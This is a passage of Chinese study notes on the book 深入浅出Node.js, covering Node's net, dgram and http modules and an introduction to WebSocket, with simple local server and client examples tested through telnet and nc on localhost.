<p>读取一个相同的大文件时，highWaterMark值的大小与读取速度的关系：该值越大，读取速度越快。</p>
<h3 id="6-5-总结"><a href="#6-5-总结" class="headerlink" title="6.5 总结"></a>6.5 总结</h3><p>体验过JavaScript友好的字符串操作后，有些开发者可能会形成思维定势，将Buffer当做字符串来理解。但字符串与Buffer之间有实质上的差异，即Buffer是二进制数据，字符串与Buffer之间存在编码关系。因此，理解Buffer的诸多细节十分必要，对于如何高效处理二进制数据十分有用。</p>
<h2 id="第07章-网络编程"><a href="#第07章-网络编程" class="headerlink" title="第07章 网络编程"></a>第07章 网络编程</h2><p>Node是一个面向网络而生的平台，它具有事件驱动、无阻塞、单线程等特性，具备良好的可伸缩性，使得它十分轻量，适合在分布式网络中扮演各种各样的角色。同时Node提供的API十分贴合网络，适合用它基础的API构建灵活的网络服务。</p>
<p>在Web领域，大多数的编程语言需要专门的Web服务器作为容器，如ASP、ASP.NET需要IIS作为服务器，PHP需要搭载Apache或Nginx环境等，JSP需要Tomcat服务器等。但对于Node而言，只需要几行代码即可构建服务器，无需额外的容器。</p>
<p>Node提供了net、dgram、http、https这4个模块，分别用于处理TCP、UDP、HTTP、HTTPS，适用于服务器端和客户端。</p>
<h3 id="7-1-1-TCP"><a href="#7-1-1-TCP" class="headerlink" title="7.1.1 TCP"></a>7.1.1 TCP</h3><p>TCP全名为传输控制协议，在OSI模型（由七层组成，分别为物理层、数据链结层、网络层、传输层、会话层、表示层、应用层）中属于传输层协议。许多应用层协议基于TCP构建，典型的是HTTP、SMTP、IMAP等协议。</p>
<p>只有会话形成之后，服务器端和客户端之间才能互相发送数据。在创建会话的过程中，服务器端和客户端分别提供一个套接字，这两个套接字共同形成一个连接。服务器端与客户端则通过套接字实现两者之间连接的操作。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>计算机基础(^_^)</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<h3 id="7-1-2-创建TCP服务器端"><a href="#7-1-2-创建TCP服务器端" class="headerlink" title="7.1.2 创建TCP服务器端"></a>7.1.2 创建TCP服务器端</h3><p>我们可以开始创建一个TCP服务器端来接受网络请求，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</div><div class="line"><span class="keyword">var</span> server = net.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123; <span class="comment">// 新的连接</span></div><div class="line">  socket.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">    socket.write(<span class="string">"你好"</span>);</div><div class="line">  &#125;);</div><div class="line">  socket.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'连接断开'</span>);</div><div class="line">  &#125;);</div><div class="line">  socket.write(<span class="string">"欢迎光临《深入浅出Node.js》示例：\n"</span>);</div><div class="line">&#125;);</div><div class="line">server.listen(<span class="number">8124</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'server bound'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>我们通过net.createServer(listener)即可创建一个TCP服务器，listener是连接事件connection的侦听器，也可以采用如下的方式进行侦听：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> server = net.createServer();</div><div class="line">server.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</div><div class="line">  <span class="comment">// 新的连接</span></div><div class="line">&#125;);</div><div class="line">server.listen(<span class="number">8124</span>);</div></pre></td></tr></table></figure>
<p>我们可以利用Telnet工具作为客户端对刚才创建的简单服务器进行会话交流，相关代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">$ telnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8124</span></div><div class="line">Trying <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>...</div><div class="line">Connected to localhost.</div><div class="line">Escape character is <span class="string">'^]'</span>.欢迎光临《深入浅出Node.js》</div><div class="line">示例：</div><div class="line">hi</div><div class="line">你好</div></pre></td></tr></table></figure>
<p>除了端口外，同样我们也可以对Domain Socket进行监听，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">server.listen(&apos;/tmp/echo.sock&apos;);</div></pre></td></tr></table></figure>
<p>通过nc工具进行会话，测试上面构建的TCP服务的代码如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ nc -U /tmp/echo.sock欢迎光临《深入浅出Node.js》</div><div class="line"></div><div class="line">示例：</div><div class="line">hi你好</div></pre></td></tr></table></figure>
<p>通过net模块自行构造客户端进行会话，测试上面构建的TCP服务的代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</div><div class="line"><span class="keyword">var</span> client = net.connect(&#123;</div><div class="line">  <span class="attr">port</span>: <span class="number">8124</span></div><div class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">//'connect' listener</span></div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'client connected'</span>);</div><div class="line">  client.write(<span class="string">'world!\r\n'</span>);</div><div class="line">&#125;);</div><div class="line">client.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(data.toString());</div><div class="line">  client.end();</div><div class="line">&#125;);</div><div class="line">client.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'client disconnected'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>将以上客户端代码存为client.js并执行，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ node client.js</div></pre></td></tr></table></figure>
<p>client connected</p>
<p>欢迎光临《深入浅出Node.js》示例：<br>你好<br>client disconnected</p>
<p>其结果与使用Telnet和nc的会话结果并无差别。如果是Domain Socket，在填写选项时，填写path即可，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> client = net.connect(&#123;<span class="attr">path</span>: <span class="string">'/tmp/echo.sock'</span>&#125;);</div></pre></td></tr></table></figure>
<h3 id="7-1-3-TCP服务的事件"><a href="#7-1-3-TCP服务的事件" class="headerlink" title="7.1.3 TCP服务的事件"></a>7.1.3 TCP服务的事件</h3><p>对于通过net.createServer()创建的服务器而言，它是一个EventEmitter实例，它的自定义事件有如下几种。</p>
<ul>
<li>listening：在调用server.listen()绑定端口或者Domain Socket后触发，简洁写法为server.listen(port,listeningListener)，通过listen()方法的第二个参数传入。</li>
<li>connection：每个客户端套接字连接到服务器端时触发，简洁写法为通过net.create-Server()，最后一个参数传递。</li>
<li>close：当服务器关闭时触发，在调用server.close()后，服务器将停止接受新的套接字连接，但保持当前存在的连接，等待所有连接都断开后，会触发该事件。</li>
<li>error：当服务器发生异常时，将会触发该事件。比如侦听一个使用中的端口，将会触发一个异常，如果不侦听error事件，服务器将会抛出异常。</li>
</ul>
<p>连接事件</p>
<p>服务器可以同时与多个客户端保持连接，对于每个连接而言是典型的可写可读Stream对象。Stream对象可以用于服务器端和客户端之间的通信，既可以通过data事件从一端读取另一端发来的数据，也可以通过write()方法从一端向另一端发送数据。</p>
<ul>
<li>data：当一端调用write()发送数据时，另一端会触发data事件，事件传递的数据即是write()发送的数据。</li>
</ul>
<ul>
<li>end：当连接中的任意一端发送了FIN数据时，将会触发该事件。</li>
</ul>
<ul>
<li>connect：该事件用于客户端，当套接字与服务器端连接成功时会被触发。</li>
</ul>
<ul>
<li>drain：当任意一端调用write()发送数据时，当前这端会触发该事件。</li>
</ul>
<ul>
<li>error：当异常发生时，触发该事件。</li>
</ul>
<ul>
<li>close：当套接字完全关闭时，触发该事件</li>
</ul>
<ul>
<li>timeout：当一定时间后连接不再活跃时，该事件将会被触发，通知用户当前该连接已经被闲置了。</li>
</ul>
<p>由于TCP套接字是可写可读的Stream对象，可以利用pipe()方法巧妙地实现管道操作</p>
<p>值得注意的是，TCP针对网络中的小数据包有一定的优化策略：Nagle算法。如果每次只发送一个字节的内容而不优化，网络中将充满只有极少数有效数据的数据包，将十分浪费网络资源。Nagle算法针对这种情况，要求缓冲区的数据达到一定数量或者一定时间后才将其发出，所以小数据包将会被Nagle算法合并，以此来优化网络。这种优化虽然使网络带宽被有效地使用，但是数据有可能被延迟发送。</p>
<p>在Node中，由于TCP默认启用了Nagle算法，可以调用socket.setNoDelay(true)去掉Nagle算法，使得write()可以立即发送数据到网络中。</p>
<p>另一个需要注意的是，尽管在网络的一端调用write()会触发另一端的data事件，但是并不意味着每次write()都会触发一次data事件，在关闭掉Nagle算法后，另一端可能会将接收到的多个小数据包合并，然后只触发一次data事件。</p>
<h3 id="7-2-构建UDP服务"><a href="#7-2-构建UDP服务" class="headerlink" title="7.2 构建UDP服务"></a>7.2 构建UDP服务</h3><p>但在UDP中，一个套接字可以与多个UDP服务通信，它虽然提供面向事务的简单不可靠信息传输服务，在网络差的情况下存在丢包严重的问题，但是由于它无须连接，资源消耗低，处理快速且灵活，所以常常应用在那种偶尔丢一两个数据包也不会产生重大影响的场景，比如音频、视频等。UDP目前应用很广泛，DNS服务即是基于它实现的。</p>
<h3 id="7-2-1-创建UDP套接字"><a href="#7-2-1-创建UDP套接字" class="headerlink" title="7.2.1 创建UDP套接字"></a>7.2.1 创建UDP套接字</h3><p>7.2.1　创建UDP套接字<br>创建UDP套接字十分简单，UDP套接字一旦创建，既可以作为客户端发送数据，也可以作为服务器端接收数据。下面的代码创建了一个UDP套接字：var dgram = require(‘dgram’);<br>var socket = dgram.createSocket(“udp4”);</p>
<h3 id="7-2-2-创建UDP服务器端"><a href="#7-2-2-创建UDP服务器端" class="headerlink" title="7.2.2 创建UDP服务器端"></a>7.2.2 创建UDP服务器端</h3><p>若想让UDP套接字接收网络消息，只要调用dgram.bind(port,[address])方法对网卡和端口进行绑定即可。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> dgram = <span class="built_in">require</span>(<span class="string">"dgram"</span>);</div><div class="line"><span class="keyword">var</span> server = dgram.createSocket(<span class="string">"udp4"</span>);</div><div class="line">server.on(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">msg, rinfo</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"server got: "</span> + msg + <span class="string">" from "</span> + rinfo.address\ + <span class="string">":"</span> + rinfo.port);</div><div class="line">&#125;);</div><div class="line">server.on(<span class="string">"listening"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> address = server.address();</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"server listening "</span> + address.address + <span class="string">":"</span> +</div><div class="line">    address.port);</div><div class="line">&#125;);</div><div class="line">server.bind(<span class="number">41234</span>);</div></pre></td></tr></table></figure>
<p>该套接字将接收所有网卡上41234端口上的消息。在绑定完成后，将触发listening事件。</p>
<h3 id="7-2-4-UDP套接字事件"><a href="#7-2-4-UDP套接字事件" class="headerlink" title="7.2.4 UDP套接字事件"></a>7.2.4 UDP套接字事件</h3><p>UDP套接字相对TCP套接字使用起来更简单，它只是一个EventEmitter的实例，而非Stream的实例。</p>
<ul>
<li>message：当UDP套接字侦听网卡端口后，接收到消息时触发该事件，触发携带的数据为消息Buffer对象和一个远程地址信息。</li>
</ul>
<ul>
<li>listening：当UDP套接字开始侦听时触发该事件</li>
</ul>
<ul>
<li><p>close：调用close()方法时触发该事件，并不再触发message事件。如需再次触发message事件，重新绑定即可。</p>
</li>
<li><p>error：当异常发生时触发该事件，如果不侦听，异常将直接抛出，使进程退出。</p>
</li>
</ul>
<h3 id="7-3-构建HTTP服务"><a href="#7-3-构建HTTP服务" class="headerlink" title="7.3 构建HTTP服务"></a>7.3 构建HTTP服务</h3><p>TCP与UDP都属于网络传输层协议，如果要构造高效的网络应用，就应该从传输层进行着手</p>
<p>但是对于经典的应用场景，则无须从传输层协议入手构造自己的应用，比如HTTP或SMTP等，这些经典的应用层协议对于普通应用而言绰绰有余。Node提供了基本的http和https模块用于HTTP和HTTPS的封装，对于其他应用层协议的封装，也能从社区中轻松找到其实现。</p>
<p>在Node中构建HTTP服务极其容易，Node官网上的经典例子就展示了如何用寥寥几行代码实现一个HTTP服务器，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span></div><div class="line">  &#125;);</div><div class="line">  res.end(<span class="string">'Hello World\n'</span>);</div><div class="line">&#125;).listen(<span class="number">1337</span>, <span class="string">'127.0.0.1'</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http: //127.0.0.1:1337/'</span>);</div></pre></td></tr></table></figure>
<p>尽管这个HTTP服务器简单到只能回复Hello World，但是它能维持的并发量和QPS都是不容小觑的，其背后的原因在第3章中有叙述，此处我们不再探讨</p>
<p><strong>7.3.1 HTTP</strong></p>
<p>从上述的报文信息中可以看出HTTP的特点，它是基于请求响应式的，以一问一答的方式实现服务，虽然基于TCP会话，但是本身却并无会话的特点。</p>
<p>从协议的角度来说，现在的应用，如浏览器，其实是一个HTTP的代理，用户的行为将会通过它转化为HTTP请求报文发送给服务器端，服务器端在处理请求后，发送响应报文给代理，代理在解析报文后，将用户需要的内容呈现在界面上</p>
<p>以浏览器打开一张图片地址为例：</p>
<ul>
<li>首先，浏览器构造HTTP报文发向图片服务器端；</li>
<li>然后，服务器端判断报文中的要请求的地址，将磁盘中的图片文件以报文的形式发送给浏览器；</li>
<li>浏览器接收完图片后，调用渲染引擎将其显示给用户。</li>
</ul>
<p>简而言之，HTTP服务只做两件事情：处理HTTP请求和发送HTTP响应。</p>
<h3 id="7-3-2-http模块"><a href="#7-3-2-http模块" class="headerlink" title="7.3.2 http模块"></a>7.3.2 http模块</h3><p>Node的http模块包含对HTTP处理的封装。在Node中，HTTP服务继承自TCP服务器（net模块），它能够与多个客户端保持连接，由于其采用事件驱动的形式，并不为每一个连接创建额外的线程或进程，保持很低的内存占用，所以能实现高并发</p>
<p>HTTP服务与TCP服务模型有区别的地方在于，在开启keepalive后，一个TCP会话可以用于多次请求和响应。TCP服务以connection为单位进行服务，HTTP服务以request为单位进行服务。http模块即是将connection到request的过程进行了封装</p>
<p>http模块将连接所用套接字的读写抽象为ServerRequest和ServerResponse对象，它们分别对应请求和响应操作。</p>
<p>对于TCP连接的读操作，http模块将其封装为ServerRequest对象。让我们再次查看前面的请求报文，报文头部将会通过http_parser进行解析。请求报文的代码如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET / HTTP/1.1 </div><div class="line">User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5</div><div class="line">Host: 127.0.0.1:1337&gt;</div><div class="line">Accept: */*</div></pre></td></tr></table></figure>
<p>报文头第一行GET / HTTP/1.1被解析之后分解为如下属性。</p>
<ul>
<li><code>req.method</code>属性 ： 值为GET，是为请求方法，常见的请求方法有GET、POST、DELETE、PUT、CONNECT等几种。req.url属性：值为/。</li>
<li><code>req.httpVersion</code>属性：值为1.1。其余报头是很规律的Key: Value格式，被解析后放置在req.headers属性上传递给业务逻辑以供调用，如下所示：</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">headers: &#123;</div><div class="line">  'user-agent': 'curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL / 0.9 .8 r zlib / 1.2 .5 ', </div><div class="line">  host: '127.0 .0 .1: 1337 ',</div><div class="line">  accept: '*/*'</div><div class="line">&#125;,</div></pre></td></tr></table></figure>
<p>报文体部分则抽象为一个只读流对象，如果业务逻辑需要读取报文体中的数据，则要在这个数据流结束后才能进行操作，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123; </div><div class="line">  <span class="comment">// console.log(req.headers);</span></div><div class="line">  <span class="keyword">var</span> buffers = [];</div><div class="line">  req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">trunk</span>) </span>&#123;</div><div class="line">    buffers.push(trunk);</div><div class="line">  &#125;).on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> buffer = Buffer.concat(buffers); <span class="comment">// TODO</span></div><div class="line">    res.end(<span class="string">'Hello world'</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>HTTP请求对象和HTTP响应对象是相对较底层的封装，现行的Web框架如Connect和Express都是在这两个对象的基础上进行高层封装完成的。</p>
<p>HTTP响应<br>再来看看HTTP响应对象。HTTP响应相对简单一些，它封装了对底层连接的写操作，可以将其看成一个可写的流对象。它影响响应报文头部信息的API为res.setHeader()和res.writeHead()。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</div></pre></td></tr></table></figure>
<p>其分为setHeader()和writeHead()两个步骤。它在http模块的封装下，实际生成如下报文：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"></div><div class="line">&lt; HTTP/1.1 200 OK</div><div class="line"></div><div class="line">&lt; Content-Type: text/plain 我们可以调用setHeader进行多次设置，但只有调用writeHead后，报头才会写入到连接中。除此之外，http模块会自动帮你设置一些头信息，如下所示：</div><div class="line"></div><div class="line">&lt; Date: Sat, 06 Apr 2013 08:01:44 GMT</div><div class="line">&lt; Connection: keep-alive</div><div class="line">&lt; Transfer-Encoding: chunked</div><div class="line">&lt;</div></pre></td></tr></table></figure>
<p>报文体部分则是调用res.write()和res.end()方法实现，后者与前者的差别在于res.end()会先调用write()发送数据，然后发送信号告知服务器这次响应结束，响应结果如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">Hello World</div></pre></td></tr></table></figure>
<p>响应结束后，HTTP服务器可能会将当前的连接用于下一个请求，或者关闭连接。值得注意的是，报头是在报文体发送前发送的，一旦开始了数据的发送，writeHead()和setHeader()将不再生效。这由协议的特性决定。</p>
<p>另外，无论服务器端在处理业务逻辑时是否发生异常，务必在结束时调用res.end()结束请求，否则客户端将一直处于等待的状态。当然，也可以通过延迟res.end()的方式实现客户端与服务器端之间的长连接，但结束时务必关闭连接。</p>
<p>HTTP服务的事件</p>
<p>如同TCP服务一样，HTTP服务器也抽象了一些事件，以供应用层使用，同样典型的是，服务器也是一个EventEmitter实例。</p>
<ul>
<li>connection事件：在开始HTTP请求和响应前，客户端与服务器端需要建立底层的TCP连接，这个连接可能因为开启了keep-alive，可以在多次请求响应之间使用；当这个连接建立时，服务器触发一次connection事件。</li>
</ul>
<ul>
<li>request事件：建立TCP连接后，http模块底层将在数据流中抽象出HTTP请求和HTTP响应，当请求数据发送到服务器端，在解析出HTTP请求头后，将会触发该事件；在res.end()后，TCP连接可能将用于下一次请求响应。</li>
</ul>
<ul>
<li>close事件：与TCP服务器的行为一致，调用server.close()方法停止接受新的连接，当已有的连接都断开时，触发该事件；可以给server.close()传递一个回调函数来快速注册该事件</li>
</ul>
<ul>
<li>checkContinue事件：某些客户端在发送较大的数据时，并不会将数据直接发送，而是先发送一个头部带Expect: 100-continue的请求到服务器，服务器将会触发checkContinue事件；如果没有为服务器监听这个事件，服务器将会自动响应客户端100 Continue的状态码，表示接受数据上传；如果不接受数据的较多时，响应客户端400Bad Request拒绝客户端继续发送数据即可。需要注意的是，当该事件发生时不会触发request事件，两个事件之间互斥。当客户端收到100 Continue后重新发起请求时，才会触发request事件</li>
</ul>
<ul>
<li>connect事件：当客户端发起CONNECT请求时触发，而发起CONNECT请求通常在HTTP代理时出现；如果不监听该事件，发起该请求的连接将会关闭。</li>
</ul>
<ul>
<li>upgrade事件：当客户端要求升级连接的协议时，需要和服务器端协商，客户端会在请求头中带上Upgrade字段，服务器端会在接收到这样的请求时触发该事件。这在后文的WebSocket部分有详细流程的介绍。如果不监听该事件，发起该请求的连接将会关闭。</li>
</ul>
<ul>
<li>clientError事件：连接的客户端触发error事件时，这个错误会传递到服务器端，此时触发该事件。</li>
</ul>
<h3 id="7-3-3-HTTP客户端"><a href="#7-3-3-HTTP客户端" class="headerlink" title="7.3.3 HTTP客户端"></a>7.3.3 HTTP客户端</h3><p>在对服务器端的实现进行了描述后，HTTP客户端的原理几乎不用再描述，因为它就是服务器端服务模型的另一部分，处于HTTP的另一端，在整个报文的参与中，报文头和报文体由它产生。同时http模块提供了一个底层API：http.request(options, connect)，用于构造HTTP客户端。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> options = &#123;</div><div class="line">  <span class="attr">hostname</span>: <span class="string">'127.0.0.1'</span>,</div><div class="line">  <span class="attr">port</span>: <span class="number">1334</span>,</div><div class="line">  <span class="attr">path</span>: <span class="string">'/'</span>,</div><div class="line">  <span class="attr">method</span>: <span class="string">'GET'</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">var</span> req = http.request(options, <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'STATUS: '</span> +</div><div class="line">    res.statusCode);</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'HEADERS: '</span> + <span class="built_in">JSON</span>.stringify(res.headers));</div><div class="line">  res.setEncoding(<span class="string">'utf8'</span>);</div><div class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(chunk);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div><div class="line">req.end();</div></pre></td></tr></table></figure>
<p>host：服务器的域名或IP地址，默认为localhost。<br>hostname：服务器名称。<br>port：服务器端口，默认为80。<br>localAddress：建立网络连接的本地网卡。<br>socketPath：Domain套接字路径。<br>method：HTTP请求方法，默认为GET。<br>path：请求路径，默认为/。<br>headers：请求头对象。<br>auth：Basic认证，这个值将被计算成请求头中的Authorization部分。</p>
<p>报文体的内容由请求对象的write()和end()方法实现：通过write()方法向连接中写入数据，通过end()方法告知报文结束。它与浏览器中的Ajax调用几近相同，Ajax的实质就是一个异步的网络HTTP请求。</p>
<p>HTTP客户端的响应对象与服务器端较为类似，在ClientRequest对象中，它的事件叫做response。ClientRequest在解析响应报文时，一解析完响应头就触发response事件，同时传递一个响应对象以供操作ClientResponse。后续响应报文体以只读流的方式提供，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'STATUS: '</span> + res.statusCode);</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'HEADERS: '</span> + <span class="built_in">JSON</span>.stringify(res.headers));</div><div class="line">  res.setEncoding(<span class="string">'utf8'</span>);</div><div class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(chunk);</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>由于从响应读取数据与服务器端ServerRequest读取数据的行为较为类似，此处不再赘述。</p>
<p>如同服务器端的实现一般，http提供的ClientRequest对象也是基于TCP层实现的，在keepalive的情况下，一个底层会话连接可以多次用于请求。为了重用TCP连接，http模块包含一个默认的客户端代理对象http.globalAgent。它对每个服务器端（host + port）创建的连接进行了管理，默认情况下，通过ClientRequest对象对同一个服务器端发起的HTTP请求最多可以创建5个连接。它的实质是一个连接池，</p>
<p>调用HTTP客户端同时对一个服务器发起10次HTTP请求时，其实质只有5个请求处于并发状态，后续的请求需要等待某个请求完成服务后才真正发出。这与浏览器对同一个域名有下载连接数的限制是相同的行为。</p>
<p>如果你在服务器端通过ClientRequest调用网络中的其他HTTP服务，记得关注代理对象对网络请求的限制。一旦请求量过大，连接限制将会限制服务性能。如需要改变，可以在options中传递agent选项。默认情况下，请求会采用全局的代理对象，默认连接数限制的为5</p>
<p>我们既可以自行构造代理对象，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> agent = <span class="keyword">new</span> http.Agent(&#123;</div><div class="line">  <span class="attr">maxSockets</span>: <span class="number">10</span></div><div class="line">&#125;);</div><div class="line"><span class="keyword">var</span> options = &#123;</div><div class="line">  <span class="attr">hostname</span>: <span class="string">'127.0.0.1'</span>,</div><div class="line">  <span class="attr">port</span>: <span class="number">1334</span>,</div><div class="line">  <span class="attr">path</span>: <span class="string">'/'</span>,</div><div class="line">  <span class="attr">method</span>: <span class="string">'GET'</span>,</div><div class="line">  <span class="attr">agent</span>: agent</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>也可以设置agent选项为false值，以脱离连接池的管理，使得请求不受并发的限制。</p>
<p>Agent对象的sockets和requests属性分别表示当前连接池中使用中的连接数和处于等待状态的请求数，在业务中监视这两个值有助于发现业务状态的繁忙程度。</p>
<p>与服务器端对应的，HTTP客户端也有相应的事件。</p>
<ul>
<li>response：与服务器端的request事件对应的客户端在请求发出后得到服务器端响应时，会触发该事件。</li>
<li>socket：当底层连接池中建立的连接分配给当前请求对象时，触发该事件</li>
<li>connect：当客户端向服务器端发起CONNECT请求时，如果服务器端响应了200状态码，客户端将会触发该事件。</li>
<li>upgrade：客户端向服务器端发起Upgrade请求时，如果服务器端响应了101 Switching Protocols状态，客户端将会触发该事件。</li>
<li>continue：客户端向服务器端发起Expect:100-continue头信息，以试图发送较大数据量，如果服务器端响应100 Continue状态，客户端将触发该事件。</li>
</ul>
<h3 id="7-4-构建WebSocket服务"><a href="#7-4-构建WebSocket服务" class="headerlink" title="7.4 构建WebSocket服务"></a>7.4 构建WebSocket服务</h3><p>提到Node，不能错过的是WebSocket协议。它与Node之间的配合堪称完美，其理由有两条。<br>WebSocket客户端基于事件的编程模型与Node中自定义事件相差无几。WebSocket实现了客户端与服务器端之间的长连接，而Node事件驱动的方式十分擅长与大量的客户端保持高并发连接。</p>
<p>客户端与服务器端只建立一个TCP连接，可以使用更少的连接。<br>WebSocket服务器端可以推送数据到客户端，这远比HTTP请求响应模式更灵活、更高效。有更轻量级的协议头，减少数据传送量。</p>
<p>WebSocket最早是作为HTML5重要特性而出现的，最终在W3C和IETF的推动下，形成RFC<br>6455规范。现代浏览器大多都支持WebSocket协议，接下来我们用一段代码来展现WebSocket在客户端的应用示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">'ws://127.0.0.1:12010/updates'</span>);</div><div class="line">socket.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (socket.bufferedAmount == <span class="number">0</span>) socket.send(getUpdateData());</div><div class="line">  &#125;, <span class="number">50</span>);</div><div class="line">&#125;;</div><div class="line">socket.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123; <span class="comment">// TODO：event.data</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>浏览器与服务器端创建WebSocket协议请求，在请求完成后连接打开，每50毫秒向服务器端发送一次数据，同时可以通过onmessage()方法接收服务器端传来的数据。这行为与TCP客户端十分相似，相较于HTTP，它能够双向通信。浏览器一旦能够使用WebSocket，可以想象应用的使用空间极大。</p>
<p>在WebSocket之前，网页客户端与服务器端进行通信最高效的是Comet技术。实现Comet技术的细节是采用长轮询（long-polling）或iframe流。长轮询的原理是客户端向服务器端发起请求，服务器端只在超时或有数据响应时断开连接（res.end()）；客户端在收到数据或者超时后重新发起请求。这个请求行为拖着长长的尾巴，是故用Comet（彗星）来命名它。</p>
<p>使用WebSocket的话，网页客户端只需一个TCP连接即可完成双向通信，在服务器端与客户端频繁通信时，无须频繁断开连接和重发请求。连接可以得到高效应用，编程模型也十分简洁。</p>
<p>相比HTTP，WebSocket更接近于传输层协议，它并没有在HTTP的基础上模拟服务器端的推送，而是在TCP上定义独立的协议。让人迷惑的部分在于WebSocket的握手部分是由HTTP完成的，使人觉得它可能是基于HTTP实现的。</p>
<p>WebSocket协议主要分为两个部分：握手和数据传输</p>
<h3 id="7-4-1-WebSocket握手"><a href="#7-4-1-WebSocket握手" class="headerlink" title="7.4.1 WebSocket握手"></a>7.4.1 WebSocket握手</h3><p>WebSocket握手<br>客户端建立连接时，通过HTTP发起请求报文，如下所示：</p>
